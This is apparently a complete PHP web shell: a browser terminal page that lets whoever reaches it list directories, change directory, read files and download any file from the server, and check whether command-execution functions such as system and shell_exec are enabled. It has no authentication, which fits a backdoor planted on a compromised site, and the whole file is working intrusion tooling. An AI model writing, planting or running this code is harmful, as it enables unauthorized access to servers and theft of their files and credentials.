<?php

$current_page_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if(isset($_POST['cmd'])) {

    $input_string = isset($_POST['cmd'])? $_POST['cmd'] : "whoami";
    $input = explode(" ", $input_string);
    $cmd = $input[0];
    $params = array_slice($input, 1); 

    //config
    $check_execution = false;
    $show_version = false;
    $show_phpinfo = false;

    function response($b) {
        echo '<font color="white">' . $b . '</font></br></br>';
        die();
    }

    function error($b) {
        echo '<font color="red">' . $b . '</font></br></br>';
        die();
    }

    function warning($b) {
        echo '<font color="yellow">' . $b . '</font></br></br>';
        die();
    }

    function download($file) {
        if (file_exists($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($file).'"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($file));
                readfile($file);
                exit;
            }
    }

    function ls($path) {
        $response = "";
        $files = scandir($path);
        foreach ($files as $f) {
            $file = $path.'/'.$f;
            $permissions = fileperms($file);
            $owner = fileowner($file);
            $group = filegroup($file);
            $size = filesize($file);
            $date = date("F d Y H:i:s.", filectime($file));
            $response = $response . $permissions."  ".$owner."  ".$group."  ".$size."  ".$date."  ".$f."<br/>";
        }
        response($response);
    }

    function logo() {
        response("TODO");
    }

    function cd($path) {
        chdir($path);
        pwd();
    }

    function pwd() {
        response(getcwd());
    }

    function whoami() {
        if(function_exists("posix_geteuid"))
            response('Current script owner uid: ' . posix_geteuid());
        else
            response('Cannot get current user`s UID. The file owner is: ' . get_current_user() . ' (this may differ from UID)');
    }


    function check_command_execution($check) {
        if($check) {
            $response = "";
            $cmd_functions = array("exec", "passthru", "system", "shell_exec", "popen", "pcntl_exec");

            foreach($cmd_functions as $f)
            {
                $response .= "Can we execute ". $f."? ";
                if (function_exists($f)) 
                    $response .= "Yes </br>";
                else
                    $response .= "No </br>";  
            }
        }
        response($response);
    }

    function cat($file) {
        if( file_exists($file) ) {
            if(filesize($file) > 5000){
                warning("File is too big to display. Use `download` or change souce code idk");
            }
            else {
                    $content = file_get_contents($file);
                    response($content);
                }
        }
        else{
            error('File path not found. Type absolute path!');
        }

    }

    switch ($cmd) {
        case 'whoami':
            whoami();
            break;
        case 'pwd':
            pwd();
            break;
        case 'ls':
            $path = $params[0];
            ls($path);
            break;
        case 'cd':
            $path = $params[0];
            cd($path);
            break;
        case 'logo':
            logo();
            break;
        case 'cat':
            $file = $params[0];
            cat($file);
            break;
        case 'download':
            $file = $params[0];
            download($file);
            break;
        default:
            whoami();
            break;
    }
} else
{

}
?>

<script>

function clear_console(event) {
    var keyCode = ('which' in event) ? event.which : event.keyCode;
    if(keyCode == 13) {
            document.getElementById("cmd_input").value = "";
        }
}

function submit_console(event) {
    var keyCode = ('which' in event) ? event.which : event.keyCode;
    if(keyCode == 13) { 
            var cmd_input = document.getElementById("cmd_input").value;
            if(cmd_input.substring(0, 8) == "download"){
                document.getElementById("download_input").value = cmd_input;
                document.getElementById("download").submit();
            }
            else
            {
                var body_content = "cmd=" + encodeURI(cmd_input);
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "<?php echo $current_page_url ?>", true);

                //Send the proper header information along with the request
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

                xhr.onreadystatechange = function() { // Call a function when the state changes.
                    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                        var paragraph = document.getElementById("output");
                        paragraph.innerHTML += xhr.response;
                        paragraph.scrollTop = paragraph.scrollHeight;
                    }
                }
                xhr.send(body_content);
            }
        }
}

</script>

<style>
.screen{
    width:100%;
    height: 100%;
    background-color: black;
}

.input{
    height: 50px;
    float: left;
    padding: 5px 5px 5px 10px;
    position: absolute;
    width: 100%;
    bottom: 0;
}

.output {
 font-family:verdana;
 color: grey;
 overflow: auto;
 width:95%;
 height: 95%;
 padding-top: 10px;
 padding-right: 10px;
 padding-left: 10px;
}


</style>

<html>
<head>
</head>
<body>
    <div id="screen" class="screen">
        <div id="output" class="output"></div>
        <div id="input" class="input">
            <form> 
              <textarea id="cmd_input" rows="1" onkeydown="submit_console(event)" onkeyup="clear_console(event)" cols="250"></textarea> 
            </form> 
            <form target="_blank" id="download" action="<?php echo $current_page_url ?>" method="post"><input id="download_input" name="cmd" value=""></form>
        </div>
    </div>
</body>
</html>


